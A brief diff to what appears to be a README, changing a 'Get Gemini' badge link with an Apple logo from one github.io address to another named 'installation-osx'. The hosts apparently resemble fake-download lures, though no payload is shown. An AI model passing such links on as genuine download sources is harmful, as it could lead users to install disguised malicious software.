@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://kioloao39498.github.io/.github/gemini">  
+<a href="https://installation-osx.github.io/.github/gemini">  
 <img src="https://img.shields.io/badge/Get_Gemini-2E8B57?style=for-the-badge&logo=apple" alt="Get Gemini">  
 </a>  
 </div>  
